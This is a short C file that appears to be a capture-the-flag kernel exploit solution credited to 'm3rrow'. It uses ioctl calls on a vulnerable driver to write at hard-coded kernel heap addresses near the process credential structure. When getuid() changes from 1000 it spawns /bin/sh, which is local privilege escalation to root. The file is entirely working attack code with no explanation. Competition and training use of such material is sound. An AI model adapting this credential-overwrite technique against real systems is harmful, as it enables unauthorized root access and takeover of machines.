#include "libpwn.c"

int main(){
  // m3rrow's solution
  fd = blargh_open();
  prctl(PR_SET_NAME, "VERYSECRET", 0, 0, 0);
  blargh_ioctl(0xffffffffc0000045+2); // Overwrite the patch of writes once
  u64 kheap = 0xffff8880043d9a00; // 0xffff8880043a1400 near the cred struct address
  for (int i=0; i<0xfff; i++) {
        blargh_ioctl(kheap+8);
        if (getuid() != 1000) {
            printf("found one!");
            for (int x=0;x < 8;x++) {
                blargh_ioctl(kheap);
                blargh_ioctl(kheap+1);
                kheap+=4;
            }
            system("/bin/sh");
            break;
        }
        kheap += 0x100;
  }
  return 0;
}
